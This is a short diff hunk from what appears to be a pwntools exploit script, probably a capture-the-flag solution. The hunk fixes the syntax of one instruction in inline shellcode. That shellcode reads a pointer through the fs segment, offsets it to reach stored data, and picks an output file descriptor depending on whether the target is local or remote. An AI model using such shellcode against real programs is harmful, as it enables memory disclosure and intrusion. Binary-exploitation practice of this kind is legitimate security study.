@@ -435,7 +435,7 @@ else:
     p = process(binary.path)
 
 shellcode = asm(f'''
-mov rsi, qword ptr [fs:0x300]
+mov rsi, qword ptr fs:0x300
 mov rsi, qword ptr [rsi - 0x2f0]
 { 'xor rdi, rdi' if args.REMOTE else 'mov rdi, 1' }
 mov dl, 100
